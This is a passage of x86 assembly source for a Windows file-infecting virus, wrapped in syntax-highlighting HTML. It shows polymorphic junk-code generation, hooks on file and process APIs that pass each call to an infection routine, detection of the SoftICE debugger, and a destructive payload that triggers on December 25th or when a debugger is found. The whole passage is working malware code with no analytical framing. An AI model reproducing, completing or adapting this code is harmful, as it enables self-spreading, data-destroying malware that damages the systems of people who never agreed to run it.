

</span><span class="sc5">Add_Garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Add_Junk</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">End_Junk_Loop</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Junk_ADD_Reg32</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Junk_DEC_Reg32</span><span class="sc0">

</span><span class="sc5">Junk_MOV_Reg32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Free_Reg</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">MOV_Reg32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">

        </span><span class="sc6">STOSD</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">End_Junk_Loop</span><span class="sc0">

</span><span class="sc5">Junk_DEC_Reg32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Free_Reg</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">DEC_Reg32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">End_Junk_Loop</span><span class="sc0">

</span><span class="sc5">Junk_ADD_Reg32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Free_Reg</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">ADD_Reg32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">

        </span><span class="sc6">STOSD</span><span class="sc0">

</span><span class="sc5">End_Junk_Loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Add_Junk</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">Get_Free_Reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Get_Free_Reg</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Get_Free_Reg</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">Align_EAX</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Calc_Aligned</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Calc_Aligned</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">Get_Delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_EIP</span><span class="sc0">
</span><span class="sc5">Get_EIP</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Get_EIP</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">Hook_CopyFileA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixCopyFileA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_CreateFileA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixCreateFileA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_CreateProcessA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixCreateProcessA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_DeleteFileA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixDeleteFileA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_GetFileAttributesA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixGetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_MoveFileA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixMoveFileA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_MoveFileExA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixMoveFileExA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_SetFileAttributesA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixSetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_CopyFileW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixCopyFileW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_CreateFileW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixCreateFileW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_CreateProcessW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixCreateProcessW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_DeleteFileW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixDeleteFileW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_GetFileAttributesW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixGetFileAttributesW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_MoveFileW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixMoveFileW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_MoveFileExW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixMoveFileExW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Main_Dispatch</span><span class="sc0">


</span><span class="sc5">Hook_SetFileAttributesW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ixSetFileAttributesW</span><span class="sc0">

</span><span class="sc5">Main_Dispatch</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000000FFh</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Delta</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">Busy_Switch</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc1">; Set busy-flag to prevent re-entrancy.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Busy_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Do_Old_Handler</span><span class="sc4">-</span><span class="sc5">Busy_Switch</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc1">; LODSB / NOP</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Unicode_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">90ACh</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc0">                  </span><span class="sc1">; Unicode function?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Do_Infect</span><span class="sc0">

        </span><span class="sc1">; LODSW</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Unicode_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0AD66h</span><span class="sc0">

</span><span class="sc5">Do_Infect</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; Infect the sucker.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_File</span><span class="sc0">

        </span><span class="sc1">; Clear busy-flag.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Busy_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

</span><span class="sc5">Do_Old_Handler</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">API_Addresses</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+(</span><span class="sc8">EAX</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Virus_RVA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; JMP to the original API.</span><span class="sc0">



</span><span class="sc5">Perform_API</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Work_API_Index</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Init_Mode</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">API_Addresses</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+(</span><span class="sc8">EAX</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Calc_K32_Base</span><span class="sc0">

</span><span class="sc5">Use_Init_Base</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">K32_Base</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Calc_K32_Base</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Virus_RVA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">



</span><span class="sc1">; ESI = ASCIIZ / returns AX = CRC16.</span><span class="sc0">
</span><span class="sc5">Calculate_CRC16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">CLD</span><span class="sc0">

</span><span class="sc5">Load_Character</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LODSB</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Exit_Calc_CRC</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">CRC_Byte</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Loop_CRC_Byte</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDB88320h</span><span class="sc0">

</span><span class="sc5">Loop_CRC_Byte</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">CRC_Byte</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Load_Character</span><span class="sc0">

</span><span class="sc5">Exit_Calc_CRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; Activates the payload if the current date is</span><span class="sc0">
</span><span class="sc1">; December 25th or when Soft-Ice is detected.</span><span class="sc0">
</span><span class="sc5">Check_For_Payload</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">PUSHAD</span><span class="sc0">

        </span><span class="sc1">; Try to detect the presence of Soft-Ice</span><span class="sc0">
        </span><span class="sc1">; version 3.xx &amp; 4.xx (9x/NT).</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Soft-Ice's 9x driver is</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; present?</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@6</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'\\.\SICE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@6</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCreateFileA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Immediate retaliation!</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Payload</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Soft-Ice's NT driver is</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; present?</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@7</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'\\.\NTICE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@7</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCreateFileA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Immediate retaliation!</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Payload</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Local_Time</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Global_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetLocalTime</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.Current_Month</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Check_PL</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.Current_Day</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Check_PL</span><span class="sc0">

        </span><span class="sc1">; Most likely we aren't yet connected to the network so it's</span><span class="sc0">
        </span><span class="sc1">; better to wait some time before we start destroying.</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Delay_Timer</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Payload</span><span class="sc0">

